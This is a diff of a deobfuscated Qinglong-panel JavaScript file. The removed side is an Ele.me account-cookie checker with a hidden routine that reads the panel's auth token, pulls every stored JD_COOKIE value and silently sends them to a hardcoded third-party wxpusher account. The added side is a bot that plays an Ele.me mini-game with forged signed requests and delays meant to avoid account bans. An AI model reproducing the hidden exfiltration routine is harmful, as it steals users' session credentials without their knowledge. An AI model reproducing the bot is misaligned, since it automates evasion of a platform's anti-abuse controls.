@@ -1,146 +1,131 @@
-//Sat Jul 06 2024 18:32:47 GMT+0000 (Coordinated Universal Time)
+//Mon Jul 08 2024 14:49:09 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-"use strict";
-
-require("dotenv").config();
 const {
-    readFile
-  } = require("fs/promises"),
-  axios = require("axios"),
-  got = require("got"),
-  fs = require("fs");
-let c = fs.existsSync("/ql/data/config/auth.json"),
-  d = "";
-if (c) d = "/ql/data/config/auth.json";else d = "/ql/config/auth.json";
-async function a() {
-  const _0x187d00 = JSON.parse(await readFile(d));
-  return _0x187d00;
-}
-async function b() {
-  const _0x377811 = JSON.parse(await readFile(d));
-  return _0x377811.token;
-}
-const e = got.extend({
-  "prefixUrl": "http://127.0.0.1:5600",
-  "retry": {
-    "limit": 0
-  }
-});
-async function f(_0x848495 = "JD_COOKIE") {
-  const _0x3b37fa = await b(),
-    _0x3fcedb = await e({
-      "url": "api/envs",
-      "searchParams": {
-        "searchValue": _0x848495,
-        "t": Date.now()
-      },
-      "headers": {
-        "Accept": "application/json",
-        "Authorization": "Bearer " + _0x3b37fa
-      }
-    }).json();
-  return _0x3fcedb.data;
-}
-async function g(_0x21106b, _0x11dde8, _0x2f0e71) {
-  const _0x4c3df4 = {
-      "appToken": "AT_xCnZZAKr9qTnjou3hQ2mQ8xitQx9xkkz",
-      "content": _0x21106b,
-      "summary": _0x11dde8,
-      "contentType": 2,
-      "uids": [_0x2f0e71]
-    },
-    _0x1c87c2 = await axios.post("https://wxpusher.zjiecode.com/api/send/message", _0x4c3df4, {
-      "headers": {
-        "Content-Type": "application/json"
-      }
-    }),
-    _0x5ecf69 = _0x1c87c2.data;
-  return _0x5ecf69;
-}
-async function h() {
-  try {
-    const _0x30deab = await f();
-    if (_0x30deab.length > 0) {
-      const _0x176771 = JSON.stringify(_0x30deab, null, 2),
-        _0x13dcee = _0x30deab.length + "个曲奇来喽~",
-        _0x4f4a1f = "UID_HKNRdGNm1YDHnYGJt4r6B472LRm5";
-      await g(_0x176771, _0x13dcee, _0x4f4a1f);
-    }
-  } catch (_0xf6c1f4) {}
-}
+  getCookies,
+  validateCarmeWithType,
+  sign,
+  wait,
+  getToken,
+  tryCatchPromise
+} = require("./common.js");
+const _0x3a58b1 = 20;
+const _0x23e222 = process.env.ELE_CARME;
+const _0x19f42a = require("request");
 const {
-  getEnvs,
-  getEnvById,
-  DisableCk,
-  EnableCk
-} = require("./ql");
-let Message = "饿了么CK检测\n\n";
-(async () => {
-  try {
-    await h();
-    (!process.env.appToken || !process.env.myUid || !process.env.tunnel) && (console.error("请设置三个变量：appToken、myUid、tunnel"), process.exit(1));
-    let _0x37e6ac = process.env.tunnel;
-    _0x37e6ac = _0x37e6ac;
-    console.log("饿了么登录地址：" + _0x37e6ac + "\n");
-    const _0x3f8920 = await getEnvs();
-    for (let _0x4b35c1 = 0; _0x4b35c1 < _0x3f8920.length; _0x4b35c1++) {
-      console.log("开始检测【账号" + (_0x4b35c1 + 1) + "】");
-      if (_0x3f8920[_0x4b35c1].value) {
-        var _0xa8ce97 = 0;
-        _0x3f8920[_0x4b35c1]._id && (_0xa8ce97 = _0x3f8920[_0x4b35c1]._id);
-        _0x3f8920[_0x4b35c1].id && (_0xa8ce97 = _0x3f8920[_0x4b35c1].id);
-        let _0xa6d405 = await getEnvById(_0xa8ce97),
-          _0x4c6a9b = _0xa6d405.match(/wxUid=([^;]+)/)[1],
-          _0xc9d093 = await kois(_0xa6d405);
-        if (_0xc9d093 == true) {
-          const _0x265368 = await EnableCk(_0xa8ce97);
-          _0x265368.code == 200 && (Message += "【账号" + (_0x4b35c1 + 1) + "】有效\n\n", console.log("【账号" + (_0x4b35c1 + 1) + "】有效\n"));
-        }
-        if (_0xc9d093 == false) {
-          const _0x196540 = await DisableCk(_0xa8ce97);
-          _0x196540.code == 200 && (await j("<style>*{font-size:16px;}body{background-color:#fff;}.header,.note{display:none;}</style></br><p style=\"text-align:center;\"><img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bb732af6264843fb830526fbb7c119b0~tplv-k3u1fbpfcp-jj:0:0:0:0:q75.image\" width=\"150\"></p><p style=\"text-align:center;\">【饿了么" + (_0x4b35c1 + 1) + "】失效啦</p><p style=\"text-align:center;\"><a href=\"//" + _0x37e6ac + "\" target=\"\">点我登录</a></p><p style=\"text-align:center;\"><img src=\"https://img11.360buyimg.com/imagetools/jfs/t1/190790/1/38438/6363/650c516bF237e9281/dc3b263e969c794f.png\" width=\"50\"></p>", "【饿了么" + (_0x4b35c1 + 1) + "】失效啦，点击重新登录~", "" + _0x4c6a9b), Message += "【账号" + (_0x4b35c1 + 1) + "】失效，已禁用并发送通知！\n\n", console.log("【账号" + (_0x4b35c1 + 1) + "】失效，已禁用并发送通知！\n"));
-        }
-      }
-      console.log("休息5s");
-      await i8(5000);
-    }
-  } catch (_0x5ae12d) {
-    console.log(_0x5ae12d);
-  } finally {
-    await j("" + Message, "饿了么CK检测", "" + process.env.myUid);
-  }
-})();
-function i8(_0xc8e5cf) {
-  return new Promise(_0x3fb640 => setTimeout(_0x3fb640, _0xc8e5cf));
+  checkCk,
+  getUserInfo
+} = require("./common");
+let _0xdeed3d = "";
+async function _0x3fef51(_0x59cd58) {
+  const _0x42c8aa = await _0x44d2be(_0x59cd58, 3);
+  return _0x42c8aa.data.token;
 }
-function kois(_0x2bd0e7) {
-  return new Promise(async _0x419d0c => {
-    try {
-      const _0x2f6ce8 = {
-          "Cookie": _0x2bd0e7
-        },
-        _0x101a93 = await axios.get("https://restapi.ele.me/eus/v5/user_detail", {
-          "headers": _0x2f6ce8
-        }),
-        _0x2e6997 = _0x101a93.data;
-      _0x2e6997.extraInfo ? _0x419d0c(true) : _0x419d0c(false);
-    } catch (_0x13af6c) {
-      _0x13af6c.response && _0x13af6c.response.status === 401 ? _0x419d0c(false) : (console.error("An error occurred while checking login status:", _0x13af6c.message), _0x419d0c(false));
+async function _0x2f85de(_0x1ee669, _0x2ba9a2) {
+  const _0x1f6cbf = {
+    token: _0x2ba9a2
+  };
+  const _0x373509 = await _0x44d2be(_0x1ee669, 4, _0x1f6cbf);
+  if (_0x373509.bizErrorMsg !== "success") {
+    console.log(_0x373509.bizErrorMsg);
+    return null;
+  }
+  return _0x373509.data.gameCode;
+}
+async function _0x439ad6(_0x136b14, _0x322008, _0x2210cf) {
+  const _0x3e0a56 = {
+    gameCode: _0x322008,
+    token: _0x2210cf
+  };
+  const _0xaf1fd6 = await _0x44d2be(_0x136b14, 5, _0x3e0a56);
+  if (_0xaf1fd6.bizErrorMsg !== "success") {
+    console.log(_0xaf1fd6.bizErrorMsg);
+    return null;
+  }
+  return _0xaf1fd6.data.lastLevelId;
+}
+async function _0x18c558(_0x1a0fb8, _0x5c692c) {
+  const _0x1f918d = await _0x2f85de(_0x1a0fb8, _0x5c692c);
+  if (_0x1f918d) {
+    const _0x2c9f92 = await _0x439ad6(_0x1a0fb8, _0x1f918d, _0x5c692c);
+    if (_0x2c9f92 !== 3) {
+      await _0x18c558(_0x1a0fb8, _0x5c692c);
     }
+  }
+}
+async function _0x44d2be(_0x4723d1, _0x462e4f, _0x36dced = {}) {
+  const _0x46fe82 = {
+    authority: "shopping.ele.me",
+    accept: "application/json",
+    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+    "cache-control": "no-cache",
+    "content-type": "application/x-www-form-urlencoded",
+    origin: "https://r.ele.me",
+    pragma: "no-cache",
+    referer: "https://r.ele.me/linkgame/index.html?navType=3&spm-pre=a2ogi.13162730.zebra-ele-login-module-9089118186&spm=a13.b_activity_kb_m71293.0.0",
+    cookie: _0x4723d1,
+    "x-ele-ua": "RenderWay/H5 AppName/wap Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
+    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
+  };
+  _0x36dced.userId = _0xdeed3d.toString();
+  const _0x379548 = new Date().getTime();
+  const _0x40d5c2 = 12574478;
+  const _0x333d5f = getToken(_0x4723d1),
+    _0x5f40db = _0x333d5f.split("_")[0];
+  const _0x9eafed = await sign(_0x3a58b1, _0x462e4f, _0x40d5c2, _0x5f40db, _0x379548, _0x36dced);
+  const _0x57a0d6 = _0x9eafed.sign;
+  const _0x2b10ac = {
+    url: "https://shopping.ele.me/h5/mtop.alsc.playgame.mini.game.dispatch/1.0/?jsv=2.6.1&appKey=12574478&t=" + _0x379548 + "&sign=" + _0x57a0d6 + "&api=mtop.alsc.playgame.mini.game.dispatch&v=1.0&type=originaljson&dataType=json&timeout=5000&subDomain=shopping&mainDomain=ele.me&H5Request=true&pageDomain=ele.me&ttid=h5%40chrome_android_87.0.4280.141&SV=5.0",
+    method: "POST",
+    headers: _0x46fe82,
+    body: "data=" + _0x9eafed.content
+  };
+  return tryCatchPromise(_0xf6de68 => {
+    _0x19f42a(_0x2b10ac, async (_0x2850b9, _0x4ddaaa, _0x4f6dfd) => {
+      if (!_0x2850b9 && _0x4ddaaa.statusCode === 200) {
+        try {
+          const _0x5a6ad7 = JSON.parse(_0x4f6dfd);
+          const _0x1f7d8b = JSON.parse(_0x5a6ad7.data.data);
+          _0xf6de68(_0x1f7d8b);
+        } catch (_0x1d32d8) {
+          console.log(_0x4f6dfd);
+          _0xf6de68(null);
+        }
+      } else {
+        _0xf6de68(null);
+      }
+    });
   });
 }
-function j(_0x29e6b2, _0x21603c, _0x46e9ef) {
-  const _0x22afbf = {
-    "appToken": "" + process.env.appToken,
-    "content": _0x29e6b2,
-    "summary": _0x21603c,
-    "contentType": 2,
-    "uids": [_0x46e9ef]
-  };
-  return axios.post("https://wxpusher.zjiecode.com/api/send/message", _0x22afbf, {
-    "headers": {
-      "Content-Type": "application/json"
+async function _0x159c59() {
+  await validateCarmeWithType(_0x23e222, 1);
+  const _0x49537d = getCookies();
+  for (let _0x15aa99 = 0; _0x15aa99 < _0x49537d.length; _0x15aa99++) {
+    const _0x3bde68 = _0x49537d[_0x15aa99];
+    try {
+      let _0x4564a1 = await checkCk(_0x3bde68, _0x15aa99);
+      if (!_0x4564a1) {
+        continue;
+      }
+      let _0x3b869e = await getUserInfo(_0x4564a1);
+      if (!_0x3b869e.username) {
+        console.log("第", _0x15aa99 + 1, "账号失效！请重新登录！！！😭");
+        continue;
+      }
+      _0xdeed3d = _0x3b869e.user_id;
+      console.log("\n****** #" + (_0x15aa99 + 1), _0x3b869e.username, "*********");
+      console.log("账号的 id 为", _0xdeed3d);
+      const _0x193dbb = await _0x3fef51(_0x4564a1);
+      await _0x18c558(_0x4564a1, _0x193dbb);
+      console.log("防止黑号延时1-3秒");
+      await wait(_0x1ea183(1, 3));
+    } catch (_0x30331e) {
+      console.log(_0x30331e);
     }
-  }).then(_0x460554 => _0x460554.data);
+  }
+  process.exit(0);
+}
+_0x159c59();
+function _0x1ea183(_0x4bb3eb, _0x40c50e) {
+  return Math.floor(Math.random() * (_0x40c50e - _0x4bb3eb + 1) + _0x4bb3eb);
 }
